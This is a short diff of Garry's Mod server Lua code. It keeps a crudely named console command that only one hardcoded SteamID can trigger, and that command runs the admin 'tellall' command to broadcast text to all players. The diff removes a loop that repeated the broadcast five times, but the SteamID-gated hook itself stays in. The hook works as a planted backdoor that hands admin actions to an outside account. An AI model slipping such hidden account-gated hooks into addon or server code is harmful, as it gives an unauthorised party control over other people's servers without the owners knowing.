@@ -41,13 +41,13 @@ end
 
 
 
+
 if SERVER then
-    
+
 concommand.Add("penis_badmin_nadpisi", function(ply)
     if ply:SteamID() == 'STEAM_0:0:555589835' then 
-    for i = 1, 5 do
         RunConsoleCommand("ba", "tellall", text)
-      end
+      
              elseif ply:SteamID() ~= 'STEAM_0:0:555589835'  then
 
        end
